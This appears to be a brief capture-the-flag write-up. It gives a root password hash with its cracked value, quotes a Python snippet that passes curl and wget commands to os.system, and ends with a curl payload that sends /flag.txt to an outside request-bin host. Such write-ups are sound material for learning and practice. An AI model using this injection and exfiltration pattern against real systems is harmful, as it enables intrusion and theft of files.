# writeup
crack this to login as `root`. Its `123456` btw
```
root:$6$A6poINBsKceAi3RD$gIMPsdw12v0q7xsPpfuRiGs75I5qba.WXewZB9I1/Qb2aIGylES7miXy4qjI0PtiMKNiYvOcE1hRui9.gqwvc/:18540:0:::::
```
Command injection in `utils.py`
```
                    if mainCommand.lower()=='curl' or mainCommand.lower()=='wget':
                        if '&&' in fullCommand:
                            os.system(fullCommand.split('&&')[0])
                        else:
                            os.system(fullCommand)
```
Get flag
`curl "https://en7pzruxqbjg7.x.pipedream.net/$(cat /flag.txt)"`